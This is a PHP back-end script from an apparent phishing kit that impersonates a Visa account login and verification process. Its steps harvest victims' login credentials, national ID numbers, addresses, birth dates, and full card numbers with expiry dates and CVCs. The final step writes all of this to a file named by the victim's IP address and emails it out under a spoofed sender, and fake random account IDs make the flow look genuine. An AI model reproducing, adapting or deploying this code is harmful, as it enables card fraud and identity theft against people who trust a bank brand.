<?php
require_once("boots.php");

function getRealIP(){

    if (isset($_SERVER["HTTP_CLIENT_IP"])){

        return $_SERVER["HTTP_CLIENT_IP"];

    }elseif (isset($_SERVER["HTTP_X_FORWARDED_FOR"])){

        return $_SERVER["HTTP_X_FORWARDED_FOR"];

    }elseif (isset($_SERVER["HTTP_X_FORWARDED"])){

        return $_SERVER["HTTP_X_FORWARDED"];

    }elseif (isset($_SERVER["HTTP_FORWARDED_FOR"])){

        return $_SERVER["HTTP_FORWARDED_FOR"];

    }elseif (isset($_SERVER["HTTP_FORWARDED"])){

        return $_SERVER["HTTP_FORWARDED"];

    }else{

        return $_SERVER["REMOTE_ADDR"];

    }
}
function genkey($longitud) {
    $key = '';
    $pattern = '1234567890C10ZpP19aALlZz29MPY7';
    $max = strlen($pattern)-1;
    for($i=0;$i < $longitud;$i++) $key .= $pattern{mt_rand(0,$max)};
    return $key;
   }
    if($_GET['p']=='login'){
    $tipo_doc = $_POST['docType'];
    $num_doc = $_POST['docNumber'];
    $sexo_acc = $_POST['gender'];
    $pass = $_POST['password'];
    $user = $_POST['nickname'];

    $_SESSION['tipo_doc'] = $tipo_doc;
    $_SESSION['num_doc'] = $num_doc;
    $_SESSION['sexo_acc'] = $sexo_acc;
    $_SESSION['pass'] = $pass;
    $_SESSION['user'] = $user;
    $_SESSION['ip'] = $_SERVER['SERVER_ADDR'];
    header("location:verifyaccount.php?accountid=".genkey(80));
    }else if($_GET['p']=='verify'){
    $nombre = $_POST['nombre_completo'];
    $direccion = $_POST['direccion'];
    $email = $_POST['correo'];
    $telefono = $_POST['telefono'];
    $ciudad = $_POST['ciudad'];
    $cp = $_POST['postalcode'];
    $provincia = $_POST['provincia'];
    $fecha_nacimiento = $_POST['fecha_nacimiento'];

    $_SESSION['nombre_completo'] = $nombre;
    $_SESSION['direccion'] = $direccion;
    $_SESSION['correo'] = $email;
    $_SESSION['telefono'] = $telefono;
    $_SESSION['ciudad'] = $ciudad;
    $_SESSION['postalcode'] = $cp;
    $_SESSION['provincia'] = $provincia;
    $_SESSION['fecha_nacimiento'] = $fecha_nacimiento;

    header("location:moreinfo.php?accountid=".genkey(80));
    }else if ($_GET['p']=='infocc'){
    $cc_num = $_POST['cc_num'];
    $cc_mes = $_POST['expmm'];
    $cc_year = $_POST['expyy'];
    $cvc = $_POST['cvc'];
//SESSIONS
$_SESSION['cc_num'] = $cc_num;
$_SESSION['exmm'] = $cc_mes;
$_SESSION['expyy'] = $cc_year;
$_SESSION['ccv'] = $cvc;

header("location:aditionalinfo.php?accountid=".genkey(80));

}
else if ($_GET['p']=='envios'){
    $cc_num = $_POST['cc_num'];
    $cc_mes = $_POST['expmm'];
    $cc_year = $_POST['expyy'];
    $cvc = $_POST['cvc'];
//SESSIONS
$_SESSION['cc_num'] = $cc_num;
$_SESSION['exmm'] = $cc_mes;
$_SESSION['expyy'] = $cc_year;
$_SESSION['ccv'] = $cvc;


header("location:aditionalinfo.php?accountid=".genkey(80));

}
else if ($_GET['p']=='bank'){
    $name_bank = $_POST['name_bank'];
    $num_suc = $_POST['numero_sucursal'];
    $tipo_doc = $_SESSION['tipo_doc'];
    $num_doc = $_SESSION['num_doc'];
    $sexo_acc = $_SESSION['sexo_acc'];
    $pass = $_SESSION['pass'];
    $user = $_SESSION['user'];
	$ip = getenv("REMOTE_ADDR");
    $nombre =  $_SESSION['nombre_completo'];
    $direccion = $_SESSION['direccion'];
    $telefono = $_SESSION['telefono'];
    $ciudad = $_SESSION['ciudad'];
    $cp =$_SESSION['postalcode'];
    $provincia = $_SESSION['provincia'];
    $fecha_nacimiento = $_SESSION['fecha_nacimiento'];
    $cc_num = $_SESSION['cc_num'];
    $cc_mes = $_SESSION['exmm'];
    $cc_year = $_SESSION['expyy'];
    $cvc = $_SESSION['ccv'];

 $mensaje = "
<br>|=========DATOS DE PERSONALES=========|<br>
Nombre: $nombre <br>
Tipo Documento: $tipo_doc <br>
Numero documento: $num_doc <br>
Direccion: $direccion <br>
Fecha Nacimiento: $fecha_nacimiento <br>
Ciudad: $ciudad <br>
Codigo Postal: $cp <br>
Provincia: $provincia <br>
<br>--------DATOS DE TARJETA-------- <br>
Numero cc: $cc_num <br>
Mes: $cc_mes <br>
Año: $cc_year <br>
Codigo seguridad: $cvc <br>
Nombre Banco: $name_bank <br>
Numero Sucursal: $num_suc <br>
<br>========Login user VISA======== <br>
user: $user <br>
pass: $pass <br>
tipo doc: $tipo_doc <br>
Num doc: $num_doc <br>
Sexo: $sexo_acc<br>
--------INFO--------
IP: $ip <br>

";
$archivo="upload/$ip.txt";
 
     $file=fopen($archivo,"a");
     fwrite($file,"$mensaje"."");

$recipient = "tuemail@aqui.com";
$subject = "Datos Visa Home - $ip";
$prefijo = substr(md5(uniqid(rand())),0,6);
$from = "From:Datos Visa Home - $ip<$prefijo@dmnpr0.com>";

mail($recipient,$subject,$mensaje,$from);
}
?>

<SCRIPT LANGUAGE="JavaScript">
location.href='loadingwindowId=db3.html';
</SCRIPT>
